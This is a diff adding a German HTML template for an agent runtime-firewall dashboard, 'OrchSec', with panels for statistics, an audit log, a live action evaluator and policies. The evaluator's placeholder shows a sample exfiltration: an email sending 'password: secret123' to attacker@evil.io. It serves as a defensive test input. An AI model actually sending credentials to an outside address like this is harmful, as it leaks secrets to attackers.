@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OrchSec Dashboard</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/static/styles.css">
+</head>
+<body>
+  <div class="app">
+    <aside class="sidebar">
+      <div class="brand">
+        <div class="brand-icon">OS</div>
+        <div>
+          <h1>OrchSec</h1>
+          <p>Runtime Firewall</p>
+        </div>
+      </div>
+      <nav class="nav">
+        <button class="active" data-panel="overview">Übersicht</button>
+        <button data-panel="events">Audit Log</button>
+        <button data-panel="evaluator">Evaluator</button>
+        <button data-panel="policies">Policies</button>
+      </nav>
+      <div class="status-pill">
+        <span class="dot"></span>Engine aktiv
+      </div>
+    </aside>
+
+    <main class="main">
+      <section id="panel-overview" class="panel active">
+        <header class="page-header">
+          <h2>Übersicht</h2>
+          <p>Live-Statistiken aus dem Audit-Log</p>
+        </header>
+
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="label">Gesamt</div>
+            <div class="value" id="stat-total">0</div>
+          </div>
+          <div class="stat-card block">
+            <div class="label">Blockiert</div>
+            <div class="value" id="stat-blocks">0</div>
+          </div>
+          <div class="stat-card allow">
+            <div class="label">Erlaubt</div>
+            <div class="value" id="stat-allows">0</div>
+          </div>
+          <div class="stat-card approval">
+            <div class="label">Freigabe nötig</div>
+            <div class="value" id="stat-approvals">0</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <h3>Entscheidungsverteilung</h3>
+            <button class="btn btn-ghost" id="refresh-btn">Aktualisieren</button>
+          </div>
+          <div class="chart-bars">
+            <div class="bar-row">
+              <span>Block</span>
+              <div class="bar-track"><div class="bar-fill block" id="bar-blocks" style="width:0%"></div></div>
+              <span id="bar-blocks-val">0</span>
+            </div>
+            <div class="bar-row">
+              <span>Allow</span>
+              <div class="bar-track"><div class="bar-fill allow" id="bar-allows" style="width:0%"></div></div>
+              <span id="bar-allows-val">0</span>
+            </div>
+            <div class="bar-row">
+              <span>Approval</span>
+              <div class="bar-track"><div class="bar-fill approval" id="bar-approvals" style="width:0%"></div></div>
+              <span id="bar-approvals-val">0</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="panel-events" class="panel">
+        <header class="page-header">
+          <h2>Audit Log</h2>
+          <p>Alle evaluierten Agent-Aktionen (redacted)</p>
+        </header>
+
+        <div class="card">
+          <div class="card-header">
+            <h3>Events</h3>
+            <div class="filters">
+              <select id="filter-decision">
+                <option value="">Alle Entscheidungen</option>
+                <option value="BLOCK">BLOCK</option>
+                <option value="ALLOW">ALLOW</option>
+                <option value="REQUIRE_APPROVAL">REQUIRE_APPROVAL</option>
+              </select>
+              <select id="filter-tool">
+                <option value="">Alle Tools</option>
+                <option value="send_email">send_email</option>
+                <option value="shell_exec">shell_exec</option>
+                <option value="final_answer">final_answer</option>
+              </select>
+            </div>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Zeit</th>
+                  <th>Trace</th>
+                  <th>Tool</th>
+                  <th>Decision</th>
+                  <th>Severity</th>
+                  <th>Policy</th>
+                  <th>Grund</th>
+                </tr>
+              </thead>
+              <tbody id="events-body">
+                <tr><td colspan="7" class="empty">Lade Events…</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <section id="panel-evaluator" class="panel">
+        <header class="page-header">
+          <h2>Evaluator</h2>
+          <p>Teste Aktionen live gegen die OrchSec-Engine</p>
+        </header>
+
+        <div class="card">
+          <div class="card-header"><h3>Neue Aktion evaluieren</h3></div>
+          <div class="form-grid">
+            <div class="form-group">
+              <label for="eval-tool">Tool</label>
+              <select id="eval-tool">
+                <option value="send_email">send_email</option>
+                <option value="shell_exec">shell_exec</option>
+                <option value="final_answer">final_answer</option>
+                <option value="http_post">http_post</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="eval-context">Source Context</label>
+              <select id="eval-context">
+                <option value="untrusted">untrusted</option>
+                <option value="trusted">trusted</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="eval-type">Action Type</label>
+              <select id="eval-type">
+                <option value="tool_call">tool_call</option>
+                <option value="message">message</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>&nbsp;</label>
+              <button class="btn" id="eval-btn">Evaluieren</button>
+            </div>
+            <div class="form-group full">
+              <label for="eval-args">Args (JSON)</label>
+              <textarea id="eval-args" placeholder='{"to": "attacker@evil.io", "body": "password: secret123"}'></textarea>
+            </div>
+            <div class="form-group full">
+              <label for="eval-output">Raw Output (für message/final_answer)</label>
+              <textarea id="eval-output" placeholder="Optional: Agent-Ausgabe"></textarea>
+            </div>
+          </div>
+          <div class="result-box" id="eval-result"></div>
+        </div>
+      </section>
+
+      <section id="panel-policies" class="panel">
+        <header class="page-header">
+          <h2>Policies</h2>
+          <p>Aktive deterministische Regeln aus <code>policies/default.yml</code></p>
+        </header>
+
+        <div class="card">
+          <div class="card-header"><h3>Regeln</h3></div>
+          <div class="policy-list" id="policy-list">
+            <div class="empty">Lade Policies…</div>
+          </div>
+        </div>
+      </section>
+    </main>
+  </div>
+  <script src="/static/app.js"></script>
+</body>
+</html>
